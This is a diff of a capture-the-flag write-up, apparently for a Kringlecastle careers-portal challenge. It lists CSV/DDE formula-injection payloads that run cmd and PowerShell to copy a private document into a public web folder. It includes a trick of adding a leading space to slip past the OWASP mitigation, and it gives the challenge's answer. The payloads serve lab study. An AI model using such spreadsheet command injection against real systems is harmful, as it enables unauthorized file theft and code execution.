@@ -28,10 +28,10 @@ Enjoy the rest of your day
 2. Went to https://careers.kringlecastle.com/public/ and read:
 
 ```
-Publicly accessible file served from: 
+Publicly accessible file served from:
 C:\careerportal\resources\public\ not found......
 
-Try: 
+Try:
 https://careers.kringlecastle.com/public/'file name you are looking for'
 ```
 
@@ -44,5 +44,27 @@ Name, LastName
 Name, LastName
 "Mister", "=cmd|' /C copy C:\candidate_evaluation.docx C:\careerportal\resources\public\a.a) '!A0"
 
+Name, LastName
+"Mister", "=DDE(""copy""; ""C:\candidate_evaluation.docx C:\careerportal\resources\public\a.a""; ""111"")!A0"
 
 ```
+
+
+4. None of those worked. So tried to bypass the OWASP suggestion:
+
+> This attack is difficult to mitigate, and explicitly disallowed from quite a few bug bounty programs. To remediate it, ensure that no cells begin with any of the following characters:
+Equals to ("=")
+Plus ("+")
+Minus ("-")
+At ("@")
+
+5. The following payload worked like a charm:
+
+```csv
+"Aaa"," =cmd|' /C powershell.exe ""copy-item C:\candidate_evaluation.docx c:\careerportal\resources\public\eee.docx""'!A2"
+
+```
+
+6. None of the DDE payloads above worked, even putting a space before the equals. Did not try with `@`, `-` or `+`.
+
+7. Answer to the challenge `Which terrorist organization is secretly supported by the job applicant whose name begins with "K."` is `Fancy Beaver`
